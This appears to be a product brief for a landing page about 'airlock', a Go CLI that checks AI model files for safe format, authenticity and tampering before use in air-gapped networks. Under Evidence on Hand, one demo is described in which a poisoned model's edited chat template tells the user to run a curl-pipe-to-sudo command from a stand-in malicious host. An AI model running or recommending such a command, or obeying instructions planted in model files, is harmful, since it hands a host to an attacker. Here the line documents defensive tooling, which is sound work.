# Product

<!-- impeccable:product-schema 1 -->

## Platform

web

## Stack

TypeScript + Vite, static build, in `site/`. Deployed on Vercel at `airlock.sammatrix.in` (the user owns `sammatrix.in`). The user asked for TypeScript with Vite or Next.js "or whatever suits"; Vite was chosen because the page is one static landing page with no server needs.

## Users

Primary: platform, MLOps and security engineers who move AI models into air-gapped or restricted networks and need to decide whether airlock fits their intake process. Secondary: hiring managers and engineers reviewing the author's work, who judge depth from the same material. Engineers come first.

## Product Purpose

airlock is a Go CLI that checks an AI model before it enters an air-gapped network and again on the offline side before it runs. Online, `seal` refuses formats that can run code, matches weights to a pinned Hugging Face commit, and signs a manifest of every file. Offline, `verify` checks the signature and every file with no network and no other tools, and writes a Markdown report. `smoke` asks a running model server a question with a known answer. `zarf` emits a Zarf package that runs `verify` during deploy. Success: a site can show its security team proof that the model it runs is safe in format, genuine, and unchanged.

## Positioning

"Zarf moves the boxes. airlock proves the model inside is safe, genuine and unchanged." Layered on Zarf, not competing with it. Zarf's package signature proves who packed the box, not what went into it; airlock checks the model against its own seal made from the real upstream files, so a model swapped before packaging is still refused.

## Operating Context

Two machines: an online machine that seals, and an offline host with the airlock binary at `/usr/local/bin/airlock` and the public key at `/etc/airlock/cosign.pub`, installed once through the site's software intake. Transfer is by Zarf or USB. Serving is with llama.cpp or vLLM. Reports go to a security team.

## Capabilities and Constraints

- Formats: GGUF (v2, v3) and safetensors parsed in full; pickle refused; metadata checked by content; unknown file types refused.
- Signing with cosign keys only; no transparency log (air-gapped sites usually cannot reach Rekor).
- Verifier uses only the Go standard library.
- ClamAV is opt-in (`--clamav`).
- Not covered (must be stated honestly): stolen signing key, harmful model behaviour, changes after verification, a malicious upstream commit, rollback, chat templates are not inspected, metadata values and tensor bytes are not judged, a compromised online machine, small upstream files matched by SHA-1, no transparency log, serving-image vulnerabilities.
- Not done yet: offline vulnerability re-scan with a bundled database; delta updates.
- Licence: Apache-2.0 (LICENSE at the repo root). The site may say "open source".

## Brand Commitments

- Name is lowercase `airlock`.
- Logo: `docs/logo.svg`, two mint doors with a pale model square between them. Banner `docs/banner.svg`, social card `docs/social.svg`/`docs/social.png`, diagram `docs/diagram.svg`.
- Colours already used across logo, banner, diagram and demo recordings: background `#0a0e0a`, mint `#5af78e`, pale green `#c8f7c5`, grey `#8a9a8a`, red `#ff5f5f` reserved for failure.
- Voice: plain, short, factual English; states limits openly; no hype.

## Evidence on Hand

- `demo/scene1.gif` (+ `.mp4`): seal, verify, serve with llama.cpp, smoke test, chat in a browser.
- `demo/scene2.gif` (+ `.mp4`): pickle refused; a poisoned copy (edited chat template) tells the user to run `curl -s https://evil.example/docker.sh | sudo sh`; the same model in a validly signed Zarf package is blocked by airlock with a hash mismatch.
- Tested end to end with Qwen2.5 0.5B Instruct Q4_K_M at commit `9217f5db`, and with Zarf v1.0.0.
- No users, testimonials, benchmarks, stars or adoption figures exist. Do not invent any.

## Product Principles

1. Prove, don't claim: every statement on the page should be backed by a check the tool runs or a demo that shows it.
2. Honest limits are part of the product: the threat model is shown, not hidden.
3. Fit the existing intake process: complement Zarf and site tooling instead of replacing them.
4. Offline-first and dependency-light: nothing the offline side runs needs a network or extra tools.

## Accessibility & Inclusion

No product-specific requirement established; target WCAG 2.2 AA, respect reduced motion.
